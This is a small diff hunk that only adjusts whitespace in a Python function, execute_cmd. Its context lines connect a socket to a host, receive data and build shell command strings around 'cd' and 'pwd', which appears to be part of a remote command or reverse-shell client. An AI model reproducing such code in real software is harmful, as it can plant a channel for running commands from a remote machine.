@@ -13,9 +13,7 @@ def execute_cmd():
         
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
-        data = s.recv(1024)
-        
-        
+        data = s.recv(1024)  
 
         if command.startswith("cd"):        
             output = "; cd "+curr_path+" && "+command+ " && pwd"     
